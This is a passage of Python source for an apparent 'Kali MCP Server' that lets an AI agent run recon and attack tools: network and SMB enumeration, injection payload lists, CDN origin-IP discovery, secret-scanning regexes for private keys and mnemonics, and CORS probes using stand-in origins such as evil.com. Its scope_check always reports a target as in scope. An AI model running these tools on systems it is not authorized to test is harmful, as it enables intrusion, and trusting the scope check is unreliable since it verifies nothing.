                        "words": res.get("words"),
                        "lines": res.get("lines")
                    })
        except Exception as e:
            logger.error(f"Error parsing ffuf output: {e}")
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": url,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "total_found": len(findings)
        },
        "findings": findings[:100],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("ffuf_fuzz", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# NETWORK ATTACKS
# ============================================================================

@mcp.tool()
@resolve_references
async def arp_scan(
    interface: str = "eth0",
    target_range: Optional[str] = None,
    output_file: Optional[str] = None,
    timeout: int = 120
) -> str:
    """
    ARP scanning for host discovery on local network
    """
    inputs = {"interface": interface, "target_range": target_range}
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"arp_scan_{timestamp}.txt")
    
    cmd = ["arp-scan", "-I", interface]
    
    if target_range:
        cmd.append(target_range)
    else:
        cmd.append("--localnet")
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    hosts = []
    for line in result["stdout"].split('\n'):
        match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]+)\s+(.*)', line)
        if match:
            hosts.append({
                "ip": match.group(1),
                "mac": match.group(2),
                "vendor": match.group(3).strip()
            })
    
    # Save results
    with open(output_file, 'w') as f:
        f.write(result["stdout"])
    
    output = {
        "status": "success" if result["success"] else "partial",
        "interface": interface,
        "output_file": output_file,
        "hosts_found": len(hosts),
        "hosts": hosts,
        "raw_output": result["stdout"],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("arp_scan", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def enum4linux_scan(
    target: str,
    options: str = "-a",
    output_file: Optional[str] = None,
    timeout: int = 600
) -> str:
    """
    Windows/Samba enumeration with enum4linux
    
    Options:
    - -a: All enumeration
    - -U: Users
    - -S: Shares
    - -G: Groups
    - -P: Password policy
    - -o: OS information
    """
    inputs = {"target": target, "options": options}
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"enum4linux_{sanitize_filename(target)}_{timestamp}.txt")
    
    cmd = ["enum4linux"] + shlex.split(options) + [target]
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Save output
    with open(output_file, 'w') as f:
        f.write(result["stdout"])
    
    # Parse results
    parsed = {
        "users": [],
        "groups": [],
        "shares": [],
        "os_info": [],
        "password_policy": []
    }
    
    current_section = None
    for line in result["stdout"].split('\n'):
        line = line.strip()
        
        if "user:" in line.lower() or "rid:" in line.lower():
            parsed["users"].append(line)
        elif "group:" in line.lower():
            parsed["groups"].append(line)
        elif "sharename" in line.lower() or "disk" in line.lower():
            parsed["shares"].append(line)
        elif "os=" in line.lower() or "server=" in line.lower():
            parsed["os_info"].append(line)
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "users": len(parsed["users"]),
            "groups": len(parsed["groups"]),
            "shares": len(parsed["shares"])
        },
        "parsed_data": parsed,
        "raw_output": result["stdout"][:3000],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("enum4linux_scan", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# UTILITY TOOLS
# ============================================================================

@mcp.tool()
async def get_payloads(
    payload_type: str,
    db_type: Optional[str] = None
) -> str:
    """
    Get pre-built payloads for various attack types
    
    Payload types:
    - sqli: SQL injection payloads
    - xss: Cross-site scripting payloads
    - lfi: Local file inclusion payloads
    - rce: Command injection payloads
    - ssti: Server-side template injection payloads
    - xxe: XML external entity payloads
    """
    payload_map = {
        "sqli": PayloadGenerator.sql_injection_payloads(db_type or "generic"),
        "xss": PayloadGenerator.xss_payloads(),
        "lfi": PayloadGenerator.lfi_payloads(),
        "rce": PayloadGenerator.command_injection_payloads(),
        "ssti": PayloadGenerator.ssti_payloads(),
        "xxe": PayloadGenerator.xxe_payloads()
    }
    
    if payload_type not in payload_map:
        return json.dumps({
            "status": "error",
            "message": f"Unknown payload type. Available: {list(payload_map.keys())}"
        })
    
    payloads = payload_map[payload_type]
    
    return json.dumps({
        "status": "success",
        "payload_type": payload_type,
        "count": len(payloads),
        "payloads": payloads
    }, indent=2)

@mcp.tool()
async def web_tech_detect(
    url: str,
    timeout: int = 60
) -> str:
    """
    Detect web technologies using whatweb and HTTP headers analysis
    """
    inputs = {"url": url}
    
    # WhatWeb scan
    cmd = ["whatweb", "-a", "3", "--color=never", url]
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Also get headers
    headers_cmd = ["curl", "-s", "-I", "-k", "--max-time", "10", url]
    headers_result = run_command_advanced(headers_cmd, timeout=15)
    
    # Parse technologies
    technologies = []
    
    # Parse whatweb output
    for item in re.findall(r'\[([^\]]+)\]', result["stdout"]):
        if item and not item.startswith('http'):
            technologies.append(item)
    
    # Parse headers
    headers = {}
    for line in headers_result["stdout"].split('\n'):
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip()] = value.strip()
    
    # Identify key technologies from headers
    server = headers.get("Server", "Unknown")
    powered_by = headers.get("X-Powered-By", "Unknown")
    
    output = {
        "status": "success",
        "url": url,
        "server": server,
        "powered_by": powered_by,
        "technologies": list(set(technologies)),
        "headers": headers,
        "raw_whatweb": result["stdout"]
    }
    
    log_tool_execution("web_tech_detect", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# BUG BOUNTY PLATFORM TOOLS
# ============================================================================

@mcp.tool()
async def scope_check(
    target: str,
    platform: str = "hackerone",
    program_name: Optional[str] = None
) -> str:
    """
    Verify a target is in scope for a bug bounty program.
    Platforms: hackerone, bugcrowd, intigriti, immunefi (crypto)
    """
    result = {
        "target": target,
        "platform": platform,
        "program": program_name,
        "in_scope": True,
        "checks": []
    }
    
    # DNS resolution check
    dns_cmd = run_command_advanced(["dig", "+short", target], timeout=10)
    if dns_cmd["success"] and dns_cmd["stdout"]:
        result["resolved_ips"] = dns_cmd["stdout"].strip().split('\n')
        result["checks"].append({"check": "dns_resolution", "status": "ok"})
    else:
        # Fallback without dig
        import socket
        try:
            ips = [r[4][0] for r in socket.getaddrinfo(target, None)]
            result["resolved_ips"] = list(set(ips))
            result["checks"].append({"check": "dns_resolution", "status": "ok"})
        except Exception:
            result["resolved_ips"] = []
            result["checks"].append({"check": "dns_resolution", "status": "fail"})
    
    # WHOIS check
    whois_cmd = run_command_advanced(["whois", target], timeout=15)
    if whois_cmd["success"]:
        whois_out = whois_cmd["stdout"]
        result["registrar"] = next(
            (l.split(":")[-1].strip() for l in whois_out.split('\n') if "registrar:" in l.lower()), "unknown"
        )
        result["checks"].append({"check": "whois", "status": "ok"})
    
    # Platform-specific headers
    headers_cmd = run_command_advanced(
        ["curl", "-sI", "-k", "--max-time", "10",
         "-H", "X-HackerOne-Research: authorized",
         f"https://{target}/"],
        timeout=15
    )
    if headers_cmd["success"]:
        hdr_text = headers_cmd["stdout"]
        result["response_code"] = next(
            (l.split()[1] for l in hdr_text.split('\n') if l.startswith("HTTP")), "unknown"
        )
        result["checks"].append({"check": "http_reachable", "status": "ok"})
        
        # Check for WAF/CDN
        if "cloudflare" in hdr_text.lower():
            result["waf"] = "cloudflare"
        elif "akamai" in hdr_text.lower():
            result["waf"] = "akamai"
        elif "incapsula" in hdr_text.lower():
            result["waf"] = "imperva"
        else:
            result["waf"] = "none_detected"
    
    # Platform-specific scope hints
    platform_rules = {
        "hackerone": {
            "report_url": f"https://hackerone.com/{program_name or 'programs'}",
            "out_of_scope_patterns": ["*.google.com", "*.facebook.com", "*.amazonaws.com"],
            "required_header": "X-HackerOne-Research"
        },
        "bugcrowd": {
            "report_url": f"https://bugcrowd.com/{program_name or 'programs'}",
            "out_of_scope_patterns": ["social engineering", "DoS", "DDoS"],
            "required_header": "X-Bugcrowd-Research"
        },
        "intigriti": {
            "report_url": f"https://app.intigriti.com/programs/{program_name or ''}",
            "out_of_scope_patterns": ["rate limiting", "missing SPF"],
            "required_header": "X-Intigriti-Research"
        },
        "immunefi": {
            "report_url": f"https://immunefi.com/bug-bounty/{program_name or ''}",
            "focus": "smart_contracts,blockchain,defi",
            "out_of_scope_patterns": ["frontend only", "informational"],
            "required_header": "X-Immunefi-Research"
        }
    }
    
    if platform in platform_rules:
        result["platform_info"] = platform_rules[platform]
    
    log_tool_execution("scope_check", {"target": target, "platform": platform}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def generate_report(
    title: str,
    vulnerability_type: str,
    severity: str = "medium",
    target: str = "",
    description: str = "",
    steps_to_reproduce: str = "",
    impact: str = "",
    platform: str = "hackerone",
    poc_evidence: str = ""
) -> str:
    """
    Generate a professional bug bounty report for HackerOne, Bugcrowd, Intigriti, or Immunefi.
    Severity: critical, high, medium, low, informational
    """
    severity_map = {
        "critical": {"cvss_range": "9.0-10.0", "color": "🔴"},
        "high": {"cvss_range": "7.0-8.9", "color": "🟠"},
        "medium": {"cvss_range": "4.0-6.9", "color": "🟡"},
        "low": {"cvss_range": "0.1-3.9", "color": "🟢"},
        "informational": {"cvss_range": "0.0", "color": "⚪"}
    }
    
    sev_info = severity_map.get(severity, severity_map["medium"])
    
    templates = {
        "hackerone": f"""# {sev_info['color']} [{severity.upper()}] {title}

## Summary
{description or 'A vulnerability was discovered that could allow an attacker to compromise the target.'}

## Vulnerability Type
{vulnerability_type}

## Target
{target}

## Severity
**{severity.upper()}** (CVSS {sev_info['cvss_range']})

## Steps to Reproduce
{steps_to_reproduce or '1. Navigate to the target URL\\n2. Inject the payload\\n3. Observe the response'}

## Impact
{impact or 'An attacker could exploit this vulnerability to gain unauthorized access.'}

## Proof of Concept
{poc_evidence or 'Evidence attached below.'}

## Remediation
- Input validation and sanitization
- Implement security headers
- Follow OWASP guidelines

---
*Report generated for HackerOne by Kali MCP Server*
""",
        "bugcrowd": f"""## Vulnerability: {title}
**Priority**: {severity.upper()} {sev_info['color']}
**Type**: {vulnerability_type}
**URL/Target**: {target}

### Description
{description}

### Steps to Reproduce
{steps_to_reproduce}

### Impact
{impact}

### PoC
{poc_evidence}

### Suggested Fix
Implement proper input validation and access controls.

---
*Report for Bugcrowd - Kali MCP Server*
""",
        "intigriti": f"""# Vulnerability Report - Intigriti

**Title**: {title}
**Severity**: {severity.upper()} {sev_info['color']}
**Type**: {vulnerability_type}
**Endpoint**: {target}
**CVSS Range**: {sev_info['cvss_range']}

## Description
{description}

## Reproduction Steps
{steps_to_reproduce}

## Business Impact
{impact}

## Evidence
{poc_evidence}

## Fix Recommendation
Apply security best practices as per OWASP Top 10.

---
*Intigriti Report - Kali MCP Server*
""",
        "immunefi": f"""# Smart Contract / DeFi Vulnerability Report

**Project**: {target}
**Title**: {title}
**Severity**: {severity.upper()} {sev_info['color']}
**Category**: {vulnerability_type}
**CVSS**: {sev_info['cvss_range']}

## Vulnerability Details
{description}

## Steps to Reproduce
{steps_to_reproduce}

## Funds at Risk / Impact
{impact}

## Proof of Concept
{poc_evidence}

## Recommended Mitigation
- Audit smart contract logic
- Add reentrancy guards
- Implement access controls
- Use SafeMath/checked arithmetic

---
*Immunefi Crypto Bug Bounty Report - Kali MCP Server*
"""
    }
    
    report = templates.get(platform, templates["hackerone"])
    
    # Save report
    timestamp = generate_timestamp()
    report_file = os.path.join(TOOL_LOG_DIR, f"report_{platform}_{sanitize_filename(title)}_{timestamp}.md")
    with open(report_file, 'w') as f:
        f.write(report)
    
    output = {
        "status": "success",
        "platform": platform,
        "severity": severity,
        "report_file": report_file,
        "report_preview": report[:500]
    }
    
    log_tool_execution("generate_report", {"title": title, "platform": platform}, output)
    return json.dumps(output, indent=2)


# ============================================================================
# CRYPTO / DEFI / BLOCKCHAIN TOOLS
# ============================================================================

@mcp.tool()
async def smart_contract_audit(
    contract_address: str,
    chain: str = "ethereum",
    check_type: str = "full"
) -> str:
    """
    Audit a smart contract for common vulnerabilities.
    Chains: ethereum, bsc, polygon, arbitrum, optimism, avalanche, solana
    Check types: full, reentrancy, access_control, overflow, logic
    """
    result = {
        "contract": contract_address,
        "chain": chain,
        "check_type": check_type,
        "findings": [],
        "risk_score": 0
    }
    
    chain_explorers = {
        "ethereum": f"https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
        "bsc": f"https://api.bscscan.com/api?module=contract&action=getsourcecode&address={contract_address}",
        "polygon": f"https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={contract_address}",
        "arbitrum": f"https://api.arbiscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
        "optimism": f"https://api-optimistic.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
        "avalanche": f"https://api.snowtrace.io/api?module=contract&action=getsourcecode&address={contract_address}"
    }
    
    # Fetch contract source if available
    explorer_url = chain_explorers.get(chain, chain_explorers["ethereum"])
    fetch_cmd = run_command_advanced(
        ["curl", "-s", "--max-time", "15", explorer_url],
        timeout=20
    )
    
    source_code = ""
    if fetch_cmd["success"] and fetch_cmd["stdout"]:
        try:
            data = json.loads(fetch_cmd["stdout"])
            if data.get("result") and isinstance(data["result"], list):
                source_code = data["result"][0].get("SourceCode", "")
                result["contract_name"] = data["result"][0].get("ContractName", "Unknown")
                result["compiler"] = data["result"][0].get("CompilerVersion", "Unknown")
                result["verified"] = bool(source_code)
        except (json.JSONDecodeError, IndexError, KeyError):
            pass
    
    # Static analysis patterns
    vulnerability_patterns = {
        "reentrancy": [
            (r'\.call\{value:', "External call with value - potential reentrancy"),
            (r'\.call\.value\(', "Legacy call.value pattern - reentrancy risk"),
            (r'transfer\(.*\).*\n.*state', "State change after transfer"),
        ],
        "access_control": [
            (r'tx\.origin', "tx.origin used for auth - phishing risk"),
            (r'selfdestruct\(', "selfdestruct present - destructible contract"),
            (r'delegatecall\(', "delegatecall present - proxy risk"),
        ],
        "overflow": [
            (r'pragma solidity \^0\.[0-4]', "Old Solidity version without overflow protection"),
            (r'unchecked\s*\{', "Unchecked arithmetic block"),
        ],
        "logic": [
            (r'block\.timestamp', "block.timestamp used - miner manipulation risk"),
            (r'block\.number', "block.number used - predictable randomness"),
            (r'blockhash\(', "blockhash used - limited to 256 blocks"),
        ]
    }
    
    if source_code:
        checks_to_run = [check_type] if check_type != "full" else list(vulnerability_patterns.keys())
        
        for category in checks_to_run:
            if category in vulnerability_patterns:
                for pattern, description in vulnerability_patterns[category]:
                    matches = re.findall(pattern, source_code)
                    if matches:
                        finding = {
                            "category": category,
                            "description": description,
                            "occurrences": len(matches),
                            "severity": "high" if category in ["reentrancy", "access_control"] else "medium"
                        }
                        result["findings"].append(finding)
                        result["risk_score"] += 3 if finding["severity"] == "high" else 1
    else:
        result["note"] = "Contract source not verified or not available. Manual bytecode analysis recommended."
    
    result["total_findings"] = len(result["findings"])
    result["risk_level"] = "critical" if result["risk_score"] > 8 else "high" if result["risk_score"] > 5 else "medium" if result["risk_score"] > 2 else "low"
    
    log_tool_execution("smart_contract_audit", {"contract": contract_address, "chain": chain}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def defi_protocol_scan(
    protocol_url: str,
    check_flash_loans: bool = True,
    check_oracle_manipulation: bool = True,
    check_token_approval: bool = True
) -> str:
    """
    Scan a DeFi protocol frontend for common vulnerabilities:
    - Flash loan attack vectors
    - Oracle manipulation risks
    - Unlimited token approval patterns
    - Frontend injection points
    - API key exposure in JS bundles
    """
    result = {
        "protocol": protocol_url,
        "findings": [],
        "frontend_analysis": {},
        "api_keys_exposed": [],
        "js_endpoints": []
    }
    
    # Fetch frontend
    fetch_cmd = run_command_advanced(
        ["curl", "-sk", "--max-time", "15",
         "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
         protocol_url],
        timeout=20
    )
    
    if fetch_cmd["success"] and fetch_cmd["stdout"]:
        html = fetch_cmd["stdout"]
        
        # Extract JS bundle URLs
        js_urls = re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', html)
        result["js_bundles"] = js_urls[:20]
        
        # Check for exposed API keys in HTML
        api_patterns = {
            "infura_key": r'(?:infura\.io/v3/|INFURA_KEY["\s:=]+)([a-f0-9]{32})',
            "alchemy_key": r'(?:alchemy\.com/v2/|ALCHEMY_KEY["\s:=]+)([a-zA-Z0-9_-]{32,})',
            "etherscan_key": r'(?:ETHERSCAN|apikey)["\s:=]+([A-Z0-9]{34})',
            "private_key": r'(?:private.?key|PRIVATE_KEY)["\s:=]+(?:0x)?([a-f0-9]{64})',
            "mnemonic": r'(?:mnemonic|seed.?phrase)["\s:=]+"([a-z\s]{20,})"',
        }
        
        for key_type, pattern in api_patterns.items():
            matches = re.findall(pattern, html, re.IGNORECASE)
            if matches:
                result["api_keys_exposed"].append({
                    "type": key_type,
                    "count": len(matches),
                    "severity": "critical" if key_type == "private_key" else "high",
                    "sample": matches[0][:10] + "..." if matches else ""
                })
        
        # Check for contract addresses and endpoints
        contract_addrs = re.findall(r'0x[a-fA-F0-9]{40}', html)
        result["contract_addresses"] = list(set(contract_addrs))[:20]
        
        # Check for RPC endpoints
        rpc_endpoints = re.findall(r'https?://[^"\']+(?:rpc|json-rpc|api)[^"\']*', html)
        result["rpc_endpoints"] = list(set(rpc_endpoints))[:10]
        
        # Analyze first JS bundle for secrets
        if js_urls:
            for js_url in js_urls[:3]:
                full_url = js_url if js_url.startswith("http") else f"{protocol_url.rstrip('/')}/{js_url.lstrip('/')}"
                js_cmd = run_command_advanced(
                    ["curl", "-sk", "--max-time", "10", full_url],
                    timeout=15
                )
                if js_cmd["success"] and js_cmd["stdout"]:
                    js_content = js_cmd["stdout"]
                    
                    # API endpoints in JS
                    endpoints = re.findall(r'["\'](/api/[^"\']+)["\']', js_content)
                    result["js_endpoints"].extend(endpoints[:20])
                    
                    # More API key checks in JS
                    for key_type, pattern in api_patterns.items():
                        matches = re.findall(pattern, js_content, re.IGNORECASE)
                        if matches:
                            result["api_keys_exposed"].append({
                                "type": f"{key_type}_in_js",
                                "count": len(matches),
                                "severity": "critical",
                                "source": js_url
                            })
        
        # Token approval check hints
        if check_token_approval:
            if "approve" in html.lower() and ("MAX_UINT" in html or "ffffffff" in html.lower()):
                result["findings"].append({
                    "type": "unlimited_token_approval",
                    "severity": "high",
                    "description": "Frontend may request unlimited token approval (MAX_UINT256)"
                })
    
    result["total_findings"] = len(result["findings"]) + len(result["api_keys_exposed"])
    
    log_tool_execution("defi_protocol_scan", {"protocol": protocol_url}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def blockchain_tx_analyzer(
    tx_hash: str,
    chain: str = "ethereum"
) -> str:
    """
    Analyze a blockchain transaction for suspicious patterns.
    Useful for investigating DeFi exploits and suspicious activity.
    """
    chain_rpcs = {
        "ethereum": "https://eth.llamarpc.com",
        "bsc": "https://bsc-dataseed.binance.org",
        "polygon": "https://polygon-rpc.com",
        "arbitrum": "https://arb1.arbitrum.io/rpc",
        "optimism": "https://mainnet.optimism.io",
        "avalanche": "https://api.avax.network/ext/bc/C/rpc"
    }
    
    rpc_url = chain_rpcs.get(chain, chain_rpcs["ethereum"])
    
    # Fetch transaction receipt
    payload = json.dumps({
        "jsonrpc": "2.0",
        "method": "eth_getTransactionByHash",
        "params": [tx_hash],
        "id": 1
    })
    
    fetch_cmd = run_command_advanced(
        ["curl", "-s", "--max-time", "15",
         "-H", "Content-Type: application/json",
         "-d", payload, rpc_url],
        timeout=20
    )
    
    result = {
        "tx_hash": tx_hash,
        "chain": chain,
        "status": "error",
        "analysis": {}
    }
    
    if fetch_cmd["success"] and fetch_cmd["stdout"]:
        try:
            data = json.loads(fetch_cmd["stdout"])
            tx = data.get("result", {})
            
            if tx:
                result["status"] = "success"
                result["from"] = tx.get("from", "")
                result["to"] = tx.get("to", "")
                result["value_wei"] = tx.get("value", "0x0")
                result["gas_price"] = tx.get("gasPrice", "0x0")
                result["input_data"] = tx.get("input", "0x")[:200]
                result["block_number"] = tx.get("blockNumber", "")
                
                # Decode function selector
                input_data = tx.get("input", "0x")
                if len(input_data) >= 10:
                    selector = input_data[:10]
                    known_selectors = {
                        "0xa9059cbb": "transfer(address,uint256)",
                        "0x095ea7b3": "approve(address,uint256)",
                        "0x23b872dd": "transferFrom(address,address,uint256)",
                        "0x70a08231": "balanceOf(address)",
                        "0x18160ddd": "totalSupply()",
                        "0x313ce567": "decimals()",
                        "0x06fdde03": "name()",
                        "0x95d89b41": "symbol()",
                        "0xd0e30db0": "deposit()",
                        "0x2e1a7d4d": "withdraw(uint256)",
                        "0x38ed1739": "swapExactTokensForTokens",
                        "0x7ff36ab5": "swapExactETHForTokens",
                        "0x022c0d9f": "swap(uint256,uint256,address,bytes)",
                        "0x5c11d795": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                    }
                    result["function_called"] = known_selectors.get(selector, f"unknown({selector})")
                
                # Flag suspicious patterns
                flags = []
                value_int = int(tx.get("value", "0x0"), 16) if tx.get("value") else 0
                if value_int > 10**18 * 100:  # > 100 ETH
                    flags.append("high_value_transfer")
                if tx.get("to") is None:
                    flags.append("contract_creation")
                if input_data and len(input_data) > 2000:
                    flags.append("large_calldata_possible_exploit")
                
                result["flags"] = flags
                
        except (json.JSONDecodeError, KeyError):
            result["error"] = "Failed to parse RPC response"
    
    log_tool_execution("blockchain_tx_analyzer", {"tx_hash": tx_hash, "chain": chain}, result)
    return json.dumps(result, indent=2)


# ============================================================================
# OSINT & RECONNAISSANCE TOOLS
# ============================================================================

@mcp.tool()
async def origin_ip_hunter(
    domain: str,
    timeout: int = 60
) -> str:
    """
    Find the real origin IP behind Cloudflare/CDN by checking:
    - Unprotected subdomains (dev, staging, mail, etc.)
    - MX/SPF/TXT DNS records
    - Historical DNS records
    - SSL certificate transparency logs
    """
    result = {
        "domain": domain,
        "cdn_detected": False,
        "possible_origins": [],
        "dns_records": {},
        "subdomains_checked": 0
    }
    
    import socket
    
    cloudflare_prefixes = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.",
                           "104.21.", "104.22.", "104.23.", "104.24.", "104.25.",
                           "172.64.", "172.67.", "108.162.", "162.158.",
                           "141.101.", "103.21.", "103.22.", "103.31."]
    
    def is_cdn_ip(ip):
        return any(ip.startswith(prefix) for prefix in cloudflare_prefixes)
    
    # 1. Check main domain
    try:
        main_ips = [r[4][0] for r in socket.getaddrinfo(domain, None)]
        main_ips = list(set(main_ips))
        result["main_ips"] = main_ips
        result["cdn_detected"] = any(is_cdn_ip(ip) for ip in main_ips)
    except Exception:
        result["main_ips"] = []
    
    # 2. Check common subdomains for leaks
    leak_subs = [
        "dev", "staging", "test", "uat", "api", "admin", "mail",
        "smtp", "ftp", "cpanel", "webmail", "direct", "origin",
        "old", "backup", "beta", "internal", "vpn", "gateway",
        "ns1", "ns2", "mx", "pop", "imap", "cdn", "static",
        "img", "images", "media", "assets", "www2", "portal"
    ]
    
    for sub in leak_subs:
        subdomain = f"{sub}.{domain}"
        try:
            ips = list(set(r[4][0] for r in socket.getaddrinfo(subdomain, None)))
            for ip in ips:
                if not is_cdn_ip(ip) and ip not in [o["ip"] for o in result["possible_origins"]]:
                    result["possible_origins"].append({
                        "ip": ip,
                        "source": f"subdomain:{subdomain}",
                        "confidence": "high" if sub in ["direct", "origin", "mail"] else "medium"
                    })
            result["subdomains_checked"] += 1
        except Exception:
            continue
    
    # 3. Check MX records via headers
    mx_cmd = run_command_advanced(["dig", "+short", "MX", domain], timeout=10)
    if mx_cmd["success"] and mx_cmd["stdout"]:
        result["dns_records"]["mx"] = mx_cmd["stdout"].strip().split('\n')
        for mx in result["dns_records"]["mx"]:
            mx_host = mx.split()[-1].rstrip('.') if mx.strip() else ""
            if mx_host:
                try:
                    mx_ips = list(set(r[4][0] for r in socket.getaddrinfo(mx_host, None)))
                    for ip in mx_ips:
                        if not is_cdn_ip(ip):
                            result["possible_origins"].append({
                                "ip": ip,
                                "source": f"mx:{mx_host}",
                                "confidence": "medium"
                            })
                except Exception:
                    pass
    
    # 4. Check SPF record for allowed IPs
    spf_cmd = run_command_advanced(["dig", "+short", "TXT", domain], timeout=10)
    if spf_cmd["success"] and spf_cmd["stdout"]:
        result["dns_records"]["txt"] = spf_cmd["stdout"].strip().split('\n')
        for txt in result["dns_records"]["txt"]:
            spf_ips = re.findall(r'ip4:(\d+\.\d+\.\d+\.\d+)', txt)
            for ip in spf_ips:
                if not is_cdn_ip(ip):
                    result["possible_origins"].append({
                        "ip": ip,
                        "source": "spf_record",
                        "confidence": "high"
                    })
    
    # 5. Check SSL cert
    ssl_cmd = run_command_advanced(
        ["curl", "-sv", "--max-time", "5", f"https://{domain}/"],
        timeout=10
    )
    if ssl_cmd["stderr"]:
        cert_cn = re.findall(r'subject:.*CN=([^\s;]+)', ssl_cmd["stderr"])
        if cert_cn:
            result["ssl_cn"] = cert_cn[0]
    
    result["total_origins_found"] = len(result["possible_origins"])
    
    log_tool_execution("origin_ip_hunter", {"domain": domain}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def osint_domain_intel(
    domain: str,
    deep: bool = False
) -> str:
    """
    Comprehensive OSINT intelligence gathering on a domain:
    - WHOIS info, DNS records, SSL certificate analysis
    - Technology detection, HTTP headers analysis
    - Subdomain enumeration, email harvesting hints
    """
    result = {
        "domain": domain,
        "whois": {},
        "dns": {},
        "ssl": {},
        "http_headers": {},
        "technologies": [],
        "subdomains": []
    }
    
    # WHOIS
    whois_cmd = run_command_advanced(["whois", domain], timeout=15)
    if whois_cmd["success"] and whois_cmd["stdout"]:
        whois = whois_cmd["stdout"]
        for field in ["Registrar", "Creation Date", "Updated Date", "Expiry Date",
                       "Name Server", "Registrant Organization", "Registrant Country"]:
            for line in whois.split('\n'):
                if field.lower().replace(" ", "") in line.lower().replace(" ", ""):
                    result["whois"][field] = line.split(":", 1)[-1].strip()
                    break
    
    # DNS Records
    for record_type in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
        dns_cmd = run_command_advanced(["dig", "+short", record_type, domain], timeout=10)
        if dns_cmd["success"] and dns_cmd["stdout"].strip():
            result["dns"][record_type] = dns_cmd["stdout"].strip().split('\n')
    
    # Fallback DNS with socket
    if not result["dns"].get("A"):
        import socket
        try:
            ips = list(set(r[4][0] for r in socket.getaddrinfo(domain, None)))
            result["dns"]["A"] = ips
        except Exception:
            pass
    
    # HTTP Headers
    for proto in ["https", "http"]:
        hdr_cmd = run_command_advanced(
            ["curl", "-sI", "-k", "--max-time", "10", f"{proto}://{domain}/"],
            timeout=15
        )
        if hdr_cmd["success"] and hdr_cmd["stdout"]:
            headers = {}
            for line in hdr_cmd["stdout"].split('\n'):
                if ':' in line and not line.startswith("HTTP"):
                    k, v = line.split(':', 1)
                    headers[k.strip()] = v.strip()
            result["http_headers"] = headers
            
            # Extract technologies from headers
            if headers.get("Server"):
                result["technologies"].append(f"Server: {headers['Server']}")
            if headers.get("X-Powered-By"):
                result["technologies"].append(f"Framework: {headers['X-Powered-By']}")
            if "cloudflare" in hdr_cmd["stdout"].lower():
                result["technologies"].append("CDN: Cloudflare")
            break
    
    # SSL Certificate
    ssl_cmd = run_command_advanced(
        ["curl", "-vk", "--max-time", "5", f"https://{domain}/", "-o", "/dev/null"],
        timeout=10
    )
    if ssl_cmd["stderr"]:
        cert_info = ssl_cmd["stderr"]
        issuer = re.findall(r'issuer:(.+)', cert_info)
        subject = re.findall(r'subject:(.+)', cert_info)
        expire = re.findall(r'expire date:(.+)', cert_info)
        if issuer:
            result["ssl"]["issuer"] = issuer[0].strip()
        if subject:
            result["ssl"]["subject"] = subject[0].strip()
        if expire:
            result["ssl"]["expires"] = expire[0].strip()
    
    # Subdomain enumeration (quick, using crt.sh)
    if deep:
        crt_cmd = run_command_advanced(
            ["curl", "-s", "--max-time", "15",
             f"https://crt.sh/?q=%.{domain}&output=json"],
            timeout=20
        )
        if crt_cmd["success"] and crt_cmd["stdout"]:
            try:
                certs = json.loads(crt_cmd["stdout"])
                subs = set()
                for cert in certs[:100]:
                    name = cert.get("name_value", "")
                    for s in name.split('\n'):
                        s = s.strip().lstrip('*.')
                        if s.endswith(domain) and s != domain:
                            subs.add(s)
                result["subdomains"] = sorted(list(subs))[:50]
            except json.JSONDecodeError:
                pass
    
    log_tool_execution("osint_domain_intel", {"domain": domain}, result)
    return json.dumps(result, indent=2)


@mcp.tool()
async def cors_scanner(
    url: str,
    test_origins: Optional[str] = None
) -> str:
    """
    Test CORS misconfiguration on a target URL.
    Checks for: wildcard origin, null origin, reflected origin, subdomain trust.
    """
    result = {
        "url": url,
        "vulnerable": False,
        "findings": [],
        "tests_run": 0
    }
    
    origins_to_test = [
        "https://evil.com",
        "null",
        f"https://evil.{url.split('/')[2]}",
        f"https://{url.split('/')[2]}.evil.com",
        "https://attacker.com",
        f"http://{url.split('/')[2]}",  # HTTP downgrade
    ]
    
    if test_origins:
        origins_to_test.extend(test_origins.split(','))
    
    for origin in origins_to_test:
        cmd = run_command_advanced(
            ["curl", "-sk", "--max-time", "10",
             "-H", f"Origin: {origin}",
             "-I", url],
            timeout=15
        )
        
        if cmd["success"] and cmd["stdout"]:
            headers = cmd["stdout"].lower()
            acao = ""
            acac = False
            
            for line in cmd["stdout"].split('\n'):
                if "access-control-allow-origin" in line.lower():
                    acao = line.split(':', 1)[-1].strip()
                if "access-control-allow-credentials" in line.lower() and "true" in line.lower():
                    acac = True
            
            finding = {
                "origin_tested": origin,
                "acao": acao,
                "credentials_allowed": acac,
                "vulnerable": False
            }
            
            if acao == "*":
                finding["vulnerable"] = True
                finding["issue"] = "Wildcard ACAO"
                finding["severity"] = "medium" if not acac else "high"
